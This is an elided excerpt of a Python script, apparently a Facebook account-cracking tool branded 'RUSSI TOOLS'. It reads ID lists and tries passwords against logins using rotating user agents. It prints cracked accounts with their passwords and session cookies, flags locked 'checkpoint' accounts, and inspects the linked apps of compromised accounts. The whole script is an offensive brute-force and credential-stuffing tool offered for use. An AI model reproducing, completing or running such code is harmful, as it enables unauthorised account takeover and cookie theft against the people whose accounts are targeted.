...
os.system('espeak -a 300 " WELCOME TO RUSSI TOOLS"')
pretty.install()
CON=sol()
#--------------------[ BAGIAN-MASUK ]--------------#
def DYNO():
...
def JNOKA_FILE():
    o = input ('\x1b[1;93mNAWY FILE 💳  :  \x1b[1;92m')
...
def setting():
    print('\x1b[38;5;18m[ 3 ] RANDOM ')
    hu = input('\x1b[38;5;18mOPTION :  ')
    if hu in ['1','01']:
        ...
        for bacot in id:
            ...
            id2.insert(xx,bacot)
    #print(f"\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍")
    print("\x1b[38;5;8m[ 1 ] MOBILE")
    print("\x1b[38;5;8m[ 2 ] METHOD X ZERO")
    #print(f"\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍")
    hc = input('\x1b[38;5;8mOPTION :  ')
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[38;5;5m[RAWA⭐️-OK]\x1b[38;5;220m   {idf} | \x1b[38;5;7m{pw} | \x1b[38;5;48m{kuki}')
...
def crackfree(idf,pwv):
	sys.stdout.write(f"\r[MR-RUSSI] \033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;208m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;208m]{bo} {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def cek_NIK(kuki):
	...
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              RUSSI☞︎︎︎:- %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	...
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              RUSSI☞︎︎︎:- %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
